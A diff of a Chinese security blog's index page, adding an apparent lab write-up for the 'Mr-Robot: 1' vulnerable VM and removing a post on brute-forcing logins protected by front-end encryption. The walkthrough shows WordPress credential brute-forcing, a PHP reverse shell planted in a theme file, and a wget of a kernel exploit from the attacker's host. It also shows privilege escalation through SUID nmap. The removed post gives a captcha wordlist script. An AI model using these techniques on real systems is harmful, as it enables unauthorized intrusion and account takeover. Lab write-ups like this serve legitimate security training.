@@ -255,6 +255,129 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/10/Mr-Robot-1/" class="post-title-link" itemprop="url">Mr-Robot: 1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-11-10 12:42:29 / 修改时间：15:57:50" itemprop="dateCreated datePublished" datetime="2022-11-10T12:42:29+08:00">2022-11-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Mr-Robot-1"><a href="#Mr-Robot-1" class="headerlink" title="Mr-Robot: 1"></a>Mr-Robot: 1</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先还是用nmap拿到对面的ip地址,靶机记得开nat</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -n -sP -sn 192.168.100.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/10/Mr-Robot-1/Mr-Robot-1.jpg" alt="image-20221110110904031"></p>
+<p><code>nmap -A 192.168.100.171</code></p>
+<p>22,80,443端口</p>
+<p>应该又是一场web</p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110111230278.png" alt="image-20221110111230278"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.100.171/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110111613077.png" alt="image-20221110111613077"></p>
+<p>大多都是403，只有一个登录界面有权限，还有一个robots.txt</p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110112652658.png" alt="image-20221110112652658"></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110112936692.png" alt="image-20221110112936692"></p>
+<p>第一个文件是一堆不知道什么玩意的文件</p>
+<p>073403c8a58a1f80d943455fb30724b9（第二个文件是一串字符）</p>
+<p><code>whatweb http://192.168.100.171/wp-login</code></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110111721740.png" alt="image-20221110111721740"></p>
+<p>没找到cms，没有测试到sql(后面才看到是wordpress的博客)</p>
+<p>又扫到一个<code>http://192.168.100.171/admin/index.html</code></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110112147271.png" alt="image-20221110112147271"></p>
+<p>随后查攻略得知，上面那个不知道什么玩意的文件是一堆用户名，在后台忘记密码的那个地方进行爆破。</p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110114210530.png" alt="image-20221110114210530"></p>
+<p>爆破出用户名为Elliot，再用这个字典爆破密码，密码为ER28-0652</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="/2022/11/10/Mr-Robot-1/image-20221110114718865.png" alt="image-20221110114718865"></p>
+<p>直接把马弄上去</p>
+<p>地址为<code>http://192.168.100.171/wordpress/wp-content/themes/twentyfifteen/404.php</code></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110115211320.png" alt="image-20221110115211320"></p>
+<p>随后改成反弹shell的php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/webshells/php</span><br><span class="line"></span><br><span class="line">cat php-reverse-shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122205300.png" alt="image-20221110122205300"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>还是先弄一个tty出来</p>
+<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122339397.png" alt="image-20221110122339397"></p>
+<p><code>lsb_release -a</code>查看linux版本信息</p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122504710.png" alt="image-20221110122504710"></p>
+<p>Ubuntu 14.04</p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122936419.png" alt="image-20221110122936419"></p>
+<p>下载exp</p>
+<p>用python传过去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 2333</span><br><span class="line">mkdir /tmp/sh(如果是提权的话，目前用户需要先创建一个可以创建新文件的文件夹进行操作)</span><br><span class="line">cd /tmp/sh</span><br><span class="line">wget http://192.168.101.20:2333/42276.c</span><br></pre></td></tr></table></figure>
+
+<p>编译</p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110123255149.png" alt="image-20221110123255149"></p>
+<p>出错了，我们换一个exp</p>
+<p>又出错了。。</p>
+<p>后来发现需要使用suid提权</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<p>寻找具有suid权限的文件</p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110123931959.png" alt="image-20221110123931959"></p>
+<p>有nmap</p>
+<p><code>nmap --interactive</code></p>
+<p><code>!sh</code></p>
+<p><img src="/2022/11/10/Mr-Robot-1/image-20221110124024386.png" alt="image-20221110124024386"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zijiaijd/article/details/117165224">(122条消息) nmap提权几种方式_1winner的博客-CSDN博客_nmap提权</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/08/%E8%8A%B1%E7%94%9F%E5%A3%B3%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89%E5%85%AC%E7%BD%91ip%E5%8F%8D%E5%BC%B9shell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -484,94 +607,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/" class="post-title-link" itemprop="url">前端加密爆破</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-06 13:06:50 / 修改时间：13:08:08" itemprop="dateCreated datePublished" datetime="2022-11-06T13:06:50+08:00">2022-11-06</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h1><p>有些网站对数据包中的参数进行了前端加密，对我们进行爆破造成了很大困难。</p>
-<p>现在我们来解决这个问题</p>
-<p>首先我找了一个前端加密的网站来进行试验，</p>
-<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106125305611.png" alt="image-20221106125305611"></p>
-<p>他会对我们的参数进行一个整体的加密。</p>
-<p>这时候就需要使用一款burp插件来解决这个烦恼，jsEncrypter，但是由于这款 插件是基于phantomjs运行的，所以我们还需要安装一个phantomjs。</p>
-<h1 id="插件的使用"><a href="#插件的使用" class="headerlink" title="插件的使用"></a>插件的使用</h1><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>下载好，解压好，将phantomjs放到一个新的文件夹下，这个新建文件夹包括下列文件。</p>
-<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106125535087.png" alt="image-20221106125535087"></p>
-<p>其中encode是我们在网站按f12发现的加密js定义的加密函数。</p>
-<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106125649529.png" alt="image-20221106125649529"></p>
-<p>jar包是生成的burp插件，phantomjs_server.js是其中的配置文件。</p>
-<p>注意，我这里的js函数中使用的第三方库，所以我们需要提前在cmd中安装好第三方库<code>npm install crypto-js</code></p>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>首先点开phantomjs_server.js，我们需要修改的地方只有两处</p>
-<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106125859275.png" alt="image-20221106125859275"></p>
-<p>然后，在cmd中执行<code>phantomjs.exe phantomjs_server.js</code>启动工具。</p>
-<p>在burp中引入刚才生成的jar包插件</p>
-<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106130019468.png" alt="image-20221106130019468"></p>
-<p>然后在上方可以看到插件已经加入进来了。</p>
-<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106130046463.png" alt="image-20221106130046463"></p>
-<p>将密文加入进去，就可以看到解密成功了</p>
-<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106130220931.png" alt="image-20221106130220931"></p>
-<p>如果要是爆破的话。</p>
-<p>引入脚本就可以开始爆破了</p>
-<p><img src="/2022/11/06/%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4/image-20221106130450827.png" alt="image-20221106130450827"></p>
-<h1 id="py脚本（生成密文字典）"><a href="#py脚本（生成密文字典）" class="headerlink" title="py脚本（生成密文字典）"></a>py脚本（生成密文字典）</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">  <span class="built_in">list</span>.append(<span class="string">f&#x27;<span class="subst">&#123;i:04&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data1=<span class="string">&#x27;&#x27;&#x27;xxx&#x27;</span></span><br><span class="line"><span class="string">data2 = &#x27;&#x27;&#x27;</span><span class="string">&quot;xxx&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for s in list:</span></span><br><span class="line"><span class="string">  data3 = data1+str(s)+data2</span></span><br><span class="line"><span class="string">  print(data3)</span></span><br><span class="line"><span class="string">#用于生成四位验证码的数据格式，data1和data2是验证码部分前后的数据。</span></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/26/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><span class="page-number current">27</span><a class="page-number" href="/page/28/">28</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="extend next" rel="next" href="/page/28/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/26/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><span class="page-number current">27</span><a class="page-number" href="/page/28/">28</a><span class="space">&hellip;</span><a class="page-number" href="/page/59/">59</a><a class="extend next" rel="next" href="/page/28/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -639,7 +678,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">174</span>
+          <span class="site-state-item-count">175</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
